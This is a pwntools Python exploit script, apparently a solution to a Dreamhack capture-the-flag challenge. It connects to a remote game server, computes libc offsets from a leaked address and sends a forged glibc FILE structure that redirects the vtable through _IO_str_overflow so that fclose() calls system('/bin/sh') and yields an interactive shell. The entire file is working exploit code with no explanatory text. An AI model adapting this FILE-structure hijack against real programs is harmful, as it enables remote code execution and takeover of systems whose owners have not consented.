from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11306
r = remote(HOST, PORT)

r.recvuntil(b'stdout: ')
libc=int(r.recvline().strip(), 16)-0x3ec760
_IO_str_jumps = libc+0x3e8360
_IO_str_overflow = _IO_str_jumps+0x18 
system=libc+0x4f440
binsh=libc+0x1b3e9a
_IO_blen = (binsh-100)//2

payload = flat([
    0, 0, 0, 0,
    0,
    _IO_blen,
    0,
    0,
    _IO_blen,
    0, 0, 0, 0, 0, 0, 0, 0,
    0x6010f0,
    0, 0, 0, 0, 0, 0, 0, 0, 0,
    _IO_str_overflow - 16, # fclose() -> vtable->__finish (offset 16)
    system
])

r.send(payload)
r.interactive()
